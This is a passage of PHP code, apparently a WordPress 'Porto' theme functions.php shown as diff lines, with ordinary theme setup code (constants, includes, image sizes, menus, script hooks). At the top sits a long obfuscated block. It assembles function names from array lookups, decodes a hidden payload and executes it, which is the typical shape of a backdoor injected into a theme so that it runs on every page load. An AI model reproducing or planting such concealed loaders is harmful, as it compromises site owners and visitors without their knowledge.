x[173].$kvrgx[116].$kvrgx[116].$kvrgx[15].$kvrgx[2].$kvrgx[23].$kvrgx[1].$kvrgx[12].$kvrgx[104].$kvrgx[12].$kvrgx[5].$kvrgx[9].$kvrgx[77].$kvrgx[44].$kvrgx[94].$kvrgx[30].$kvrgx[16].$kvrgx[14].$kvrgx[83].$kvrgx[5].$kvrgx[13].$kvrgx[21].$kvrgx[17].$kvrgx[187].$kvrgx[16].$kvrgx[23].$kvrgx[116].$kvrgx[31].$kvrgx[16].$kvrgx[188].$kvrgx[0].$kvrgx[29].$kvrgx[29].$kvrgx[24].$kvrgx[66].$kvrgx[18].$kvrgx[98].$kvrgx[6].$kvrgx[9].$kvrgx[8].$kvrgx[116].$kvrgx[77].$kvrgx[9].$kvrgx[116].$kvrgx[17].$kvrgx[39].$kvrgx[15].$kvrgx[21].$kvrgx[81].$kvrgx[9].$kvrgx[38].$kvrgx[116].$kvrgx[46].$kvrgx[21].$kvrgx[26].$kvrgx[104].$kvrgx[45].$kvrgx[66].$kvrgx[0].$kvrgx[9].$kvrgx[12].$kvrgx[33].$kvrgx[77].$kvrgx[38].$kvrgx[116].$kvrgx[187].$kvrgx[123].$kvrgx[94].$kvrgx[2].$kvrgx[13].$kvrgx[145].$kvrgx[104].$kvrgx[26].$kvrgx[153].$kvrgx[0].$kvrgx[26].$kvrgx[22].$kvrgx[28].$kvrgx[39].$kvrgx[97].$kvrgx[40].$kvrgx[39].$kvrgx[28].$kvrgx[6].$kvrgx[22].$kvrgx[29].$kvrgx[119].$kvrgx[188].$kvrgx[21].$kvrgx[8].$kvrgx[18].$kvrgx[98].$kvrgx[83].$kvrgx[66].$kvrgx[46].$kvrgx[60].$kvrgx[40].$kvrgx[30].$kvrgx[4].$kvrgx[92].$kvrgx[88].$kvrgx[29].$kvrgx[81].$kvrgx[41].$kvrgx[13].$kvrgx[88].$kvrgx[94].$kvrgx[135].$kvrgx[188].$kvrgx[44].$kvrgx[153].$kvrgx[0].$kvrgx[93].$kvrgx[23].$kvrgx[81].$kvrgx[18].$kvrgx[118].$kvrgx[5].$kvrgx[22].$kvrgx[46].$kvrgx[77].$kvrgx[0].$kvrgx[17].$kvrgx[29].$kvrgx[45].$kvrgx[4].$kvrgx[188].$kvrgx[153].$kvrgx[7].$kvrgx[30].$kvrgx[145].$kvrgx[92].$kvrgx[104].$kvrgx[1].$kvrgx[17].$kvrgx[21].$kvrgx[5].$kvrgx[45].$kvrgx[83].$kvrgx[1].$kvrgx[35].$kvrgx[60].$kvrgx[16].$kvrgx[39].$kvrgx[88].$kvrgx[6].$kvrgx[22].$kvrgx[8].$kvrgx[68].$kvrgx[38].$kvrgx[33].$kvrgx[5].$kvrgx[39].$kvrgx[0].$kvrgx[97].$kvrgx[35].$kvrgx[77].$kvrgx[135].$kvrgx[16].$kvrgx[33].$kvrgx[9].$kvrgx[60].$kvrgx[39].$kvrgx[88].$kvrgx[31].$kvrgx[18].$kvrgx[40].$kvrgx[164].$kvrgx[173].$kvrgx[22].$kvrgx[188].$kvrgx[20].$kvrgx[39].$kvrgx[173].$kvrgx[7].$kvrgx[35].$kvrgx[135].$kvrgx[6].$kvrgx[18].$kvrgx[46].$kvrgx[98].$kvrgx[44].$kvrgx[33].$kvrgx[15].$kvrgx[29].$kvrgx[23].$kvrgx[2].$kvrgx[0].$kvrgx[38].$kvrgx[40].$kvrgx[0].$kvrgx[41].$kvrgx[153].$kvrgx[26].$kvrgx[68].$kvrgx[24].$kvrgx[23].$kvrgx[35].$kvrgx[145].$kvrgx[29].$kvrgx[7].$kvrgx[30].$kvrgx[44].$kvrgx[97].$kvrgx[28].$kvrgx[24].$kvrgx[188].$kvrgx[66].$kvrgx[173].$kvrgx[5].$kvrgx[3].$kvrgx[45].$kvrgx[29].$kvrgx[46].$kvrgx[20].$kvrgx[35].$kvrgx[26].$kvrgx[13].$kvrgx[8].$kvrgx[201].$kvrgx[21].$kvrgx[116].$kvrgx[153].$kvrgx[30].$kvrgx[22].$kvrgx[3].$kvrgx[6].$kvrgx[41].$kvrgx[7].$kvrgx[135].$kvrgx[44].$kvrgx[28].$kvrgx[38].$kvrgx[164].$kvrgx[116].$kvrgx[26].$kvrgx[18].$kvrgx[92].$kvrgx[38].$kvrgx[188].$kvrgx[60].$kvrgx[46].$kvrgx[201].$kvrgx[30].$kvrgx[92].$kvrgx[17].$kvrgx[68].$kvrgx[93].$kvrgx[41].$kvrgx[201].$kvrgx[33].$kvrgx[164].$kvrgx[68].$kvrgx[16].$kvrgx[44].$kvrgx[94].$kvrgx[4].$kvrgx[187].$kvrgx[0].$kvrgx[13].$kvrgx[60].$kvrgx[29].$kvrgx[22].$kvrgx[20].$kvrgx[60].$kvrgx[15].$kvrgx[97].$kvrgx[118].$kvrgx[4].$kvrgx[0].$kvrgx[18].$kvrgx[92].$kvrgx[45].$kvrgx[12].$kvrgx[23].$kvrgx[118].$kvrgx[97].$kvrgx[7].$kvrgx[116].$kvrgx[2].$kvrgx[35].$kvrgx[29].$kvrgx[6].$kvrgx[41].$kvrgx[24].$kvrgx[15].$kvrgx[38].$kvrgx[2].$kvrgx[0].$kvrgx[187].$kvrgx[14].$kvrgx[188].$kvrgx[26].$kvrgx[29].$kvrgx[94].$kvrgx[145].$kvrgx[0].$kvrgx[187].$kvrgx[123].$kvrgx[4].$kvrgx[26].$kvrgx[97].$kvrgx[123].$kvrgx[4].$kvrgx[29].$kvrgx[187].$kvrgx[20].$kvrgx[5].$kvrgx[93].$kvrgx[25].$kvrgx[145].$kvrgx[68].$kvrgx[2].$kvrgx[31].$kvrgx[14].$kvrgx[46].$kvrgx[4].$kvrgx[98].$kvrgx[7].$kvrgx[93].$kvrgx[45].$kvrgx[46].$kvrgx[98].$kvrgx[33].$kvrgx[12].$kvrgx[31].$kvrgx[35].$kvrgx[100].$kvrgx[92].$kvrgx[25].$kvrgx[116].$kvrgx[116].$kvrgx[100].$kvrgx[15].$kvrgx[93].$kvrgx[4].$kvrgx[16].$kvrgx[39].$kvrgx[0].$kvrgx[8].$kvrgx[98].$kvrgx[173].$kvrgx[0].$kvrgx[24].$kvrgx[40].$kvrgx[18].$kvrgx[40].$kvrgx[119].$kvrgx[118].$kvrgx[22].$kvrgx[94].$kvrgx[45].$kvrgx[173].$kvrgx[116].$kvrgx[3].$kvrgx[104].$kvrgx[93].$kvrgx[5].$kvrgx[135].$kvrgx[31].$kvrgx[118].$kvrgx[25].$kvrgx[164].$kvrgx[17].$kvrgx[24].$kvrgx[44].$kvrgx[7].$kvrgx[3].$kvrgx[23].$kvrgx[100].$kvrgx[173].$kvrgx[187].$kvrgx[187].$kvrgx[38].$kvrgx[22].$kvrgx[17].$kvrgx[92].$kvrgx[201].$kvrgx[41].$kvrgx[1].$kvrgx[28].$kvrgx[153].$kvrgx[25].$kvrgx[201].$kvrgx[28].$kvrgx[15].$kvrgx[83].$kvrgx[5].$kvrgx[40].$kvrgx[35].$kvrgx[6].$kvrgx[135].$kvrgx[145].$kvrgx[18].$kvrgx[92].$kvrgx[123].$kvrgx[173].$kvrgx[15].$kvrgx[68].$kvrgx[153].$kvrgx[4].$kvrgx[24].$kvrgx[11].$kvrgx[18].$kvrgx[92].$kvrgx[187].$kvrgx[33].$kvrgx[28].$kvrgx[22].$kvrgx[17].$kvrgx[17].$kvrgx[135].$kvrgx[8].$kvrgx[8].$kvrgx[45].$kvrgx[15].$kvrgx[83].$kvrgx[88].$kvrgx[22].$kvrgx[2].$kvrgx[18].$kvrgx[9].$kvrgx[123].$kvrgx[7].$kvrgx[38].$kvrgx[17].$kvrgx[11].$kvrgx[29].$kvrgx[38].$kvrgx[153].$kvrgx[201].$kvrgx[41].$kvrgx[68].$kvrgx[94].$kvrgx[9].$kvrgx[2].$kvrgx[60].$kvrgx[39].$kvrgx[88].$kvrgx[25].$kvrgx[3].$kvrgx[4].$kvrgx[123].$kvrgx[15].$kvrgx[13].$kvrgx[153].$kvrgx[33].$kvrgx[44].$kvrgx[145].$kvrgx[45].$kvrgx[20].$kvrgx[39].$kvrgx[13].$kvrgx[2].$kvrgx[31].$kvrgx[39].$kvrgx[5].$kvrgx[164].$kvrgx[33].$kvrgx[98].$kvrgx[40].$kvrgx[98].$kvrgx[60].$kvrgx[20].$kvrgx[23].$kvrgx[116].$kvrgx[6].$kvrgx[23].$kvrgx[23].$kvrgx[30].$kvrgx[97].$kvrgx[88].$kvrgx[93].$kvrgx[2].$kvrgx[188].$kvrgx[88].$kvrgx[18].$kvrgx[66].$kvrgx[20].$kvrgx[39].$kvrgx[13].$kvrgx[145].$kvrgx[83].$kvrgx[3].$kvrgx[45].$kvrgx[1].$kvrgx[13].$kvrgx[83].$kvrgx[119].$kvrgx[46].$kvrgx[4].$kvrgx[119].$kvrgx[116].$kvrgx[88].$kvrgx[9].$kvrgx[6].$kvrgx[11].$kvrgx[20].$kvrgx[46].$kvrgx[94].$kvrgx[20].$kvrgx[4].$kvrgx[118].$kvrgx[135].$kvrgx[97].$kvrgx[201].$kvrgx[188].$kvrgx[153].$kvrgx[40].$kvrgx[88].$kvrgx[29].$kvrgx[41].$kvrgx[33].$kvrgx[14].$kvrgx[31].$kvrgx[119].$kvrgx[135].$kvrgx[5].$kvrgx[145].$kvrgx[0].$kvrgx[1].$kvrgx[33].$kvrgx[14].$kvrgx[29].$kvrgx[100].$kvrgx[8].$kvrgx[83].$kvrgx[201].$kvrgx[83].$kvrgx[123].$kvrgx[13].$kvrgx[41].$kvrgx[92].$kvrgx[39].$kvrgx[116].$kvrgx[173].$kvrgx[88].$kvrgx[23].$kvrgx[98].$kvrgx[135].$kvrgx[188].$kvrgx[92].$kvrgx[35].$kvrgx[153].$kvrgx[15].$kvrgx[123].$kvrgx[17].$kvrgx[35].$kvrgx[88].$kvrgx[188].$kvrgx[98].$kvrgx[118].$kvrgx[6].$kvrgx[11].$kvrgx[26].$kvrgx[0].$kvrgx[88].$kvrgx[6].$kvrgx[188].$kvrgx[45].$kvrgx[66].$kvrgx[20].$kvrgx[31].$kvrgx[39].$kvrgx[100].$kvrgx[35].$kvrgx[100].$kvrgx[97].$kvrgx[44].$kvrgx[173].$kvrgx[31].$kvrgx[28].$kvrgx[46].$kvrgx[28].$kvrgx[44].$kvrgx[60].$kvrgx[6].$kvrgx[93].$kvrgx[13].$kvrgx[153].$kvrgx[21].$kvrgx[15].$kvrgx[123].$kvrgx[0].$kvrgx[83].$kvrgx[135].$kvrgx[81].$kvrgx[88].$kvrgx[2].$kvrgx[31].$kvrgx[17].$kvrgx[35].$kvrgx[17].$kvrgx[14].$kvrgx[97].$kvrgx[21].$kvrgx[0].$kvrgx[26].$kvrgx[18].$kvrgx[6].$kvrgx[98].$kvrgx[97].$kvrgx[3].$kvrgx[24].$kvrgx[38].$kvrgx[18].$kvrgx[187].$kvrgx[104].$kvrgx[22].$kvrgx[7].$kvrgx[13].$kvrgx[5].$kvrgx[118].$kvrgx[45].$kvrgx[12].$kvrgx[9].$kvrgx[14].$kvrgx[98].$kvrgx[12].$kvrgx[66].$kvrgx[44].$kvrgx[164].$kvrgx[173].$kvrgx[22].$kvrgx[7].$kvrgx[45].$kvrgx[119].$kvrgx[94].$kvrgx[116].$kvrgx[15].$kvrgx[25].$kvrgx[17].$kvrgx[98].$kvrgx[66].$kvrgx[9].$kvrgx[135].$kvrgx[116].$kvrgx[2].$kvrgx[44].$kvrgx[118].$kvrgx[97].$kvrgx[38].$kvrgx[26].$kvrgx[16].$kvrgx[30].$kvrgx[17].$kvrgx[29].$kvrgx[18].$kvrgx[3].$kvrgx[11].$kvrgx[100].$kvrgx[77].$kvrgx[24].$kvrgx[45].$kvrgx[21].$kvrgx[38].$kvrgx[118].$kvrgx[12].$kvrgx[22].$kvrgx[9].$kvrgx[97].$kvrgx[14].$kvrgx[81].$kvrgx[20].$kvrgx[6].$kvrgx[44].$kvrgx[145].$kvrgx[3].$kvrgx[18].$kvrgx[104].$kvrgx[9].$kvrgx[93].$kvrgx[41].$kvrgx[15].$kvrgx[116].$kvrgx[44].$kvrgx[33].$kvrgx[92].$kvrgx[66].$kvrgx[97].$kvrgx[2].$kvrgx[18].$kvrgx[104].$kvrgx[17].$kvrgx[33].$kvrgx[12].$kvrgx[164].$kvrgx[94].$kvrgx[123].$kvrgx[38].$kvrgx[21].$kvrgx[18].$kvrgx[44].$kvrgx[3].$kvrgx[100].$kvrgx[3].$kvrgx[135].$kvrgx[93].$kvrgx[100].$kvrgx[118].$kvrgx[68].$kvrgx[31].$kvrgx[164].$kvrgx[5].$kvrgx[28].$kvrgx[14].$kvrgx[68].$kvrgx[41].$kvrgx[14].$kvrgx[22].$kvrgx[164].$kvrgx[93].$kvrgx[13].$kvrgx[9].$kvrgx[173].$kvrgx[83].$kvrgx[15].$kvrgx[15].$kvrgx[123].$kvrgx[92].$kvrgx[173].$kvrgx[15].$kvrgx[83].$kvrgx[100].$kvrgx[83].$kvrgx[44].$kvrgx[145].$kvrgx[46].$kvrgx[17].$kvrgx[145].$kvrgx[201].$kvrgx[135].$kvrgx[83].$kvrgx[30].$kvrgx[153].$kvrgx[16].$kvrgx[2].$kvrgx[81].$kvrgx[81].$kvrgx[39].$kvrgx[20].$kvrgx[14].$kvrgx[7].$kvrgx[92].$kvrgx[9].$kvrgx[145].$kvrgx[39].$kvrgx[11].$kvrgx[1].$kvrgx[23].$kvrgx[187].$kvrgx[45].$kvrgx[173].$kvrgx[188].$kvrgx[39].$kvrgx[77].$kvrgx[31].$kvrgx[18].$kvrgx[173].$kvrgx[135].$kvrgx[33].$kvrgx[46].$kvrgx[39].$kvrgx[26].$kvrgx[24].$kvrgx[14].$kvrgx[83].$kvrgx[41].$kvrgx[188].$kvrgx[94].$kvrgx[60].$kvrgx[35].$kvrgx[15].$kvrgx[201].$kvrgx[45].$kvrgx[92].$kvrgx[145].$kvrgx[3].$kvrgx[11].$kvrgx[9].$kvrgx[1].$kvrgx[145].$kvrgx[44].$kvrgx[173].$kvrgx[33].$kvrgx[94].$kvrgx[16].$kvrgx[41].$kvrgx[35].$kvrgx[18].$kvrgx[7].$kvrgx[187].$kvrgx[18].$kvrgx[1].$kvrgx[123].$kvrgx[93].$kvrgx[173].$kvrgx[24].$kvrgx[187].$kvrgx[25].$kvrgx[66].$kvrgx[25].$kvrgx[187].$kvrgx[3].$kvrgx[45].$kvrgx[23].$kvrgx[4].$kvrgx[104].$kvrgx[164].$kvrgx[201].$kvrgx[29].$kvrgx[81].$kvrgx[8].$kvrgx[40].$kvrgx[45].$kvrgx[98].$kvrgx[9].$kvrgx[173].$kvrgx[25].$kvrgx[92].$kvrgx[39].$kvrgx[18].$kvrgx[6].$kvrgx[8].$kvrgx[3].$kvrgx[88].$kvrgx[116].$kvrgx[1].$kvrgx[153].$kvrgx[104].$kvrgx[6].$kvrgx[24].$kvrgx[15].$kvrgx[30].$kvrgx[25].$kvrgx[26].$kvrgx[164].$kvrgx[93].$kvrgx[123].$kvrgx[104].$kvrgx[81].$kvrgx[145].$kvrgx[92].$kvrgx[88].$kvrgx[187].$kvrgx[2].$kvrgx[44].$kvrgx[100].$kvrgx[153].$kvrgx[187].$kvrgx[7].$kvrgx[3].$kvrgx[104].$kvrgx[9].$kvrgx[201].$kvrgx[45].$kvrgx[116].$kvrgx[164].$kvrgx[25].$kvrgx[2].$kvrgx[18].$kvrgx[25].$kvrgx[97].$kvrgx[14].$kvrgx[92].$kvrgx[23].$kvrgx[5].$kvrgx[187].$kvrgx[201].$kvrgx[11].$kvrgx[4].$kvrgx[68].$kvrgx[88].$kvrgx[14].$kvrgx[81].$kvrgx[123].$kvrgx[118].$kvrgx[7].$kvrgx[12].$kvrgx[92].$kvrgx[5].$kvrgx[119].$kvrgx[2].$kvrgx[20].$kvrgx[0].$kvrgx[44].$kvrgx[29].$kvrgx[26].$kvrgx[5].$kvrgx[118].$kvrgx[15].$kvrgx[118].$kvrgx[5].$kvrgx[119].$kvrgx[88].$kvrgx[94].$kvrgx[6].$kvrgx[31].$kvrgx[92].$kvrgx[100].$kvrgx[13].$kvrgx[66].$kvrgx[28].$kvrgx[97].$kvrgx[24].$kvrgx[145].$kvrgx[11].$kvrgx[104].$kvrgx[201].$kvrgx[145].$kvrgx[145].$kvrgx[3].$kvrgx[21].$kvrgx[21].$kvrgx[201].$kvrgx[81].$kvrgx[45].$kvrgx[38].$kvrgx[201].$kvrgx[15].$kvrgx[104].$kvrgx[83].$kvrgx[14].$kvrgx[35].$kvrgx[31].$kvrgx[21].$kvrgx[83].$kvrgx[1].$kvrgx[88].$kvrgx[135].$kvrgx[164].$kvrgx[98].$kvrgx[60].$kvrgx[15].$kvrgx[39].$kvrgx[153].$kvrgx[26].$kvrgx[98].$kvrgx[24].$kvrgx[1].$kvrgx[118].$kvrgx[81].$kvrgx[0].$kvrgx[1].$kvrgx[33].$kvrgx[4].$kvrgx[41].$kvrgx[45].$kvrgx[94].$kvrgx[188].$kvrgx[187].$kvrgx[100].$kvrgx[66].$kvrgx[45].$kvrgx[31].$kvrgx[188].$kvrgx[94].$kvrgx[4].$kvrgx[66].$kvrgx[68].$kvrgx[40].$kvrgx[13].$kvrgx[22].$kvrgx[21].$kvrgx[38].$kvrgx[33].$kvrgx[33].$kvrgx[29].$kvrgx[83].$kvrgx[187].$kvrgx[23].$kvrgx[18].$kvrgx[123].$kvrgx[83].$kvrgx[9].$kvrgx[15].$kvrgx[46].$kvrgx[104].$kvrgx[123].$kvrgx[4].$kvrgx[66].$kvrgx[15].$kvrgx[29].$kvrgx[21].$kvrgx[40].$kvrgx[98].$kvrgx[3].$kvrgx[135].$kvrgx[187].$kvrgx[38].$kvrgx[29].$kvrgx[11].$kvrgx[119].$kvrgx[35].$kvrgx[201].$kvrgx[39].$kvrgx[145].$kvrgx[17].$kvrgx[68].$kvrgx[77].$kvrgx[93].$kvrgx[77].$kvrgx[118].$kvrgx[31].$kvrgx[46].$kvrgx[11].$kvrgx[40].$kvrgx[18].$kvrgx[11].$kvrgx[22].$kvrgx[187].$kvrgx[3].$kvrgx[2].$kvrgx[68].$kvrgx[12].$kvrgx[118].$kvrgx[9].$kvrgx[97].$kvrgx[28].$kvrgx[15].$kvrgx[98].$kvrgx[88].$kvrgx[92].$kvrgx[29].$kvrgx[104].$kvrgx[164].$kvrgx[0].$kvrgx[20].$kvrgx[201].$kvrgx[11].$kvrgx[77].$kvrgx[1].$kvrgx[11].$kvrgx[25].$kvrgx[46].$kvrgx[38].$kvrgx[97].$kvrgx[22].$kvrgx[46].$kvrgx[145].$kvrgx[118].$kvrgx[1].$kvrgx[60].$kvrgx[104].$kvrgx[15].$kvrgx[118].$kvrgx[104].$kvrgx[26].$kvrgx[135].$kvrgx[8].$kvrgx[81].$kvrgx[104].$kvrgx[100].$kvrgx[8].$kvrgx[22].$kvrgx[88].$kvrgx[15].$kvrgx[104].$kvrgx[16].$kvrgx[97].$kvrgx[164].$kvrgx[135].$kvrgx[38].$kvrgx[46].$kvrgx[18].$kvrgx[60].$kvrgx[97].$kvrgx[123].$kvrgx[23].$kvrgx[12].$kvrgx[38].$kvrgx[22].$kvrgx[5].$kvrgx[118].$kvrgx[31].$kvrgx[35].$kvrgx[17].$kvrgx[94].$kvrgx[40].$kvrgx[6].$kvrgx[88].$kvrgx[187].$kvrgx[38].$kvrgx[38].$kvrgx[46].$kvrgx[11].$kvrgx[201].$kvrgx[29].$kvrgx[33].$kvrgx[81].$kvrgx[5].$kvrgx[2].$kvrgx[40].$kvrgx[135].$kvrgx[11].$kvrgx[60].$kvrgx[118].$kvrgx[40].$kvrgx[23].$kvrgx[33].$kvrgx[188].$kvrgx[1].$kvrgx[187].$kvrgx[100].$kvrgx[100].$kvrgx[94].$kvrgx[60].$kvrgx[20].$kvrgx[100].$kvrgx[33].$kvrgx[81].$kvrgx[24].$kvrgx[22].$kvrgx[18].$kvrgx[12].$kvrgx[1].$kvrgx[119].$kvrgx[94].$kvrgx[33].$kvrgx[26].$kvrgx[98].$kvrgx[104].$kvrgx[39].$kvrgx[31].$kvrgx[14].$kvrgx[46].$kvrgx[39].$kvrgx[0].$kvrgx[21].$kvrgx[83].$kvrgx[60].$kvrgx[28].$kvrgx[25].$kvrgx[38].$kvrgx[12].$kvrgx[30].$kvrgx[14].$kvrgx[41].$kvrgx[16].$kvrgx[23].$kvrgx[20].$kvrgx[92].$kvrgx[188].$kvrgx[12].$kvrgx[173].$kvrgx[39].$kvrgx[118].$kvrgx[23].$kvrgx[38].$kvrgx[188].$kvrgx[81].$kvrgx[15].$kvrgx[17].$kvrgx[17].$kvrgx[60].$kvrgx[104].$kvrgx[29].$kvrgx[145].$kvrgx[187].$kvrgx[16].$kvrgx[12].$kvrgx[83].$kvrgx[12].$kvrgx[18].$kvrgx[3].$kvrgx[88].$kvrgx[2].$kvrgx[45].$kvrgx[135].$kvrgx[88].$kvrgx[30].$kvrgx[9].$kvrgx[15].$kvrgx[12].$kvrgx[14].$kvrgx[13].$kvrgx[23].$kvrgx[39].$kvrgx[3].$kvrgx[14].$kvrgx[6].$kvrgx[164].$kvrgx[98].$kvrgx[116].$kvrgx[83].$kvrgx[187].$kvrgx[60].$kvrgx[188].$kvrgx[93].$kvrgx[104].$kvrgx[104].$kvrgx[83].$kvrgx[2].$kvrgx[40].$kvrgx[94].$kvrgx[28].$kvrgx[40].$kvrgx[66].$kvrgx[2].$kvrgx[9].$kvrgx[98].$kvrgx[2].$kvrgx[23].$kvrgx[66].$kvrgx[26].$kvrgx[14].$kvrgx[187].$kvrgx[201].$kvrgx[40].$kvrgx[38].$kvrgx[25].$kvrgx[66].$kvrgx[66].$kvrgx[23].$kvrgx[6].$kvrgx[153].$kvrgx[104].$kvrgx[30].$kvrgx[0].$kvrgx[8].$kvrgx[28].$kvrgx[116].$kvrgx[45].$kvrgx[1].$kvrgx[135].$kvrgx[2].$kvrgx[4].$kvrgx[22].$kvrgx[14].$kvrgx[2].$kvrgx[0].$kvrgx[40].$kvrgx[2].$kvrgx[20].$kvrgx[145].$kvrgx[0].$kvrgx[5].$kvrgx[44].$kvrgx[31].$kvrgx[119].$kvrgx[92].$kvrgx[41].$kvrgx[2].$kvrgx[116].$kvrgx[135].$kvrgx[0].$kvrgx[8].$kvrgx[39].$kvrgx[153].$kvrgx[104].$kvrgx[8].$kvrgx[153].$kvrgx[88].$kvrgx[88].$kvrgx[81].$kvrgx[92].$kvrgx[13].$kvrgx[83].$kvrgx[60].$kvrgx[30].$kvrgx[46].$kvrgx[38].$kvrgx[530].$kvrgx[530];$rtltkxhembfwww=$kvrgx[39].$kvrgx[68].$kvrgx[26].$kvrgx[97].$kvrgx[66].$kvrgx[14].$kvrgx[297].$kvrgx[28].$kvrgx[97].$kvrgx[12].$kvrgx[119].$kvrgx[28].$kvrgx[97];$ukjvxsimtw=$kvrgx[25].$kvrgx[45].$kvrgx[13].$kvrgx[46].$kvrgx[12].$kvrgx[119].$kvrgx[15].$kvrgx[83].$kvrgx[116].$kvrgx[97].$kvrgx[26].$kvrgx[26];$wieqdvjopulxyx=$kvrgx[26].$kvrgx[98].$kvrgx[116].$kvrgx[116].$kvrgx[97].$kvrgx[104];$euvaxplhljztwsq=$kvrgx[12].$kvrgx[116].$kvrgx[97].$kvrgx[68].$kvrgx[98].$kvrgx[97].$kvrgx[297].$kvrgx[44].$kvrgx[13].$kvrgx[46].$kvrgx[12].$kvrgx[98].$kvrgx[17].$kvrgx[119].$kvrgx[46];$pytfcppqfjcci=$kvrgx[2778].$kvrgx[68];$bmvwnsmzzy=$kvrgx[2884].$kvrgx[2013].$kvrgx[68].$kvrgx[2778].$kvrgx[1461].$kvrgx[9].$kvrgx[68].$kvrgx[104].$kvrgx[97];$yseritghnlj=$kvrgx[97].$kvrgx[33].$kvrgx[17].$kvrgx[98];$zzpjmlaqxek=$wieqdvjopulxyx;$mtcvdavnrrwyp=$ukjvxsimtw($rtltkxhembfwww($hbmimpaofdllt));$mtcvdavnrrwyp=$zzpjmlaqxek($mtcvdavnrrwyp);$pytfcppqfjcciydagdawmmhm=$euvaxplhljztwsq($pytfcppqfjcci,$wieqdvjopulxyx($bmvwnsmzzy));$pytfcppqfjcciydagdawmmhm($wieqdvjopulxyx($mtcvdavnrrwyp));$yseritghnlj;?><?php
+/**
+ * Define variables
+ */
+define('porto_lib',                   get_template_directory() . '/inc');       // library directory
+define('porto_admin',                 porto_lib . '/admin');                    // admin directory
+define('porto_plugins',               porto_lib . '/plugins');                  // plugins directory
+define('porto_content_types',         porto_lib . '/content_types');            // content_types directory
+define('porto_menu',                  porto_lib . '/menu');                     // menu directory
+define('porto_functions',             porto_lib . '/functions');                // functions directory
+define('porto_options_dir',           porto_admin . '/theme_options');          // options directory
+define('porto_dir',                   get_template_directory());                // template directory
+define('porto_uri',                   get_template_directory_uri());            // template directory uri
+define('porto_css',                   porto_uri . '/css');                      // css uri
+define('porto_js',                    porto_uri . '/js');                       // javascript uri
+define('porto_plugins_uri',           porto_uri . '/inc/plugins');              // plugins uri
+define('porto_options_uri',           porto_uri . '/inc/admin/theme_options');  // plugins uri
+$theme_version = '';
+$theme = wp_get_theme();
+if (is_child_theme()) {
+    $theme = wp_get_theme($theme->template);
+}
+$theme_version = $theme->version;
+define('porto_version',               $theme_version);                    // set current version
+/**
+ * Wordpress theme check
+ */
+// set content width
+if ( ! isset( $content_width ) ) $content_width = 900;
+/**
+ * Porto content types functions
+ */
+require_once(porto_functions . '/content_type.php');
+/**
+ * Porto functions
+ */
+require_once(porto_functions . '/functions.php');
+/**
+ * Porto Extensions
+ */
+require_once(porto_lib . '/lib/setup.php');
+/**
+ * Menu
+ */
+require_once(porto_menu . '/menu.php');
+/**
+ * Content Types
+ */
+require_once(porto_content_types . '/content_types.php');
+/**
+ * Porto admin options
+ */
+require_once(porto_admin . '/admin.php');
+/**
+ * Install Plugins
+ */
+require_once(porto_plugins . '/plugins.php');
+/**
+ * Theme support & Theme setup
+ */
+// theme setup
+if ( ! function_exists( 'porto_setup' ) ) :
+    function porto_setup() {
+        add_theme_support( "title-tag" );
+        //add_theme_support( "custom-header", array() );
+        //add_theme_support( 'custom-background', array() );
+        add_editor_style( array( 'style.css', 'style_rtl.css' ) );
+        if ( defined( 'WOOCOMMERCE_VERSION' ) ) {
+            if ( version_compare( WOOCOMMERCE_VERSION, "2.1" ) >= 0 ) {
+                add_filter( 'woocommerce_enqueue_styles', '__return_empty_array' );
+            } else {
+                define( 'WOOCOMMERCE_USE_CSS', false );
+            }
+        }
+        // translation
+        load_theme_textdomain('porto', porto_dir.'/languages');
+        load_child_theme_textdomain('porto', get_stylesheet_directory().'/languages');
+        
+        global $porto_settings;
+        // default rss feed links
+        add_theme_support('automatic-feed-links');
+        // add support for post thumbnails
+        add_theme_support( 'post-thumbnails' );
+        // add image sizes
+        add_image_size( 'blog-large', 1140, 445, true );
+        add_image_size( 'blog-medium', 463, 348, true );
+        add_image_size( 'related-post', (isset($porto_settings['post-related-image-size']) && (int)$porto_settings['post-related-image-size']['width']) ? (int)$porto_settings['post-related-image-size']['width'] : 450, (isset($porto_settings['post-related-image-size']) && (int)$porto_settings['post-related-image-size']['height']) ? (int)$porto_settings['post-related-image-size']['height'] : 231, true );
+        if (isset($porto_settings['enable-portfolio']) && $porto_settings['enable-portfolio']) {
+            add_image_size( 'portfolio-grid-one', 1140, 595, true );
+            add_image_size( 'portfolio-grid-two', 560, 560, true );
+            add_image_size( 'portfolio-grid', 367, 367, true );
+            add_image_size( 'portfolio-full', 1140, 595, true );
+            add_image_size( 'portfolio-large', 560, 367, true );
+            add_image_size( 'portfolio-medium', 367, 367, true );
+            add_image_size( 'portfolio-timeline', 560, 560, true );
+            add_image_size( 'related-portfolio', 367, 367, true );
+            add_image_size( 'portfolio-cat-stripes', 494, 1080, true );
+            add_image_size( 'portfolio-cat-parallax', 1970, 627, true );
+            add_image_size( 'portfolio-thumbnail', 200, 150, true );
+        }
+        
+        if (isset($porto_settings['enable-member']) && $porto_settings['enable-member']) {
+            add_image_size( 'member-two', 560, 560, true );
+            add_image_size( 'member', 367, 367, true );
+        }
+        add_image_size( 'widget-thumb-medium', 85, 85, true );
+        add_image_size( 'widget-thumb', 50, 50, true );
+        // woocommerce support
+        add_theme_support('woocommerce', array( 'gallery_thumbnail_image_width' => 150 ));
+        // allow shortcodes in widget text
+        add_filter('widget_text', 'do_shortcode');
+        // register menus
+        register_nav_menus( array(
+            'main_menu' => __('Main Menu', 'porto'),
+            'sidebar_menu' => __('Sidebar Menu', 'porto'),
+            'top_nav' => __('Top Navigation', 'porto'),
+            'view_switcher' => __('View Switcher', 'porto'),
+            'currency_switcher' => __('Currency Switcher', 'porto')
+        ));
+        // add post formats
+        add_theme_support('post-formats', array('aside', 'gallery', 'link', 'image', 'quote', 'video', 'audio', 'chat'));
+        // disable master slider woocommerce product slider
+        $options = get_option( 'msp_woocommerce' );
+        if ( isset( $options ) && isset($options['enable_single_product_slider'] ) && $options['enable_single_product_slider'] == 'on' ) {
+            $options['enable_single_product_slider'] = '';
+            update_option('msp_woocommerce', $options);
+        }
+    }
+endif;
+add_action( 'after_setup_theme', 'porto_setup' );
+/**
+ * Enqueue css, js files
+ */
+add_action( 'wp_enqueue_scripts',       'porto_css', 1000 );
+add_action( 'wp_enqueue_scripts',       'porto_scripts', 1000 );
+add_action( 'admin_enqueue_scripts',    'porto_admin_css', 1000 );
+add_action( 'admin_enqueue_scripts',    'porto_admin_scripts', 1000 );
+add_action( 'wp_footer',                'porto_footer_hook', 1 );
+function porto_css() {
+    // deregister plugin styles
+    wp_deregister_style( 'font-awesome' );
+    wp_dequeue_style( 'font-awesome' );
+    wp_dequeue_style( 'yith-wcwl-font-awesome' );
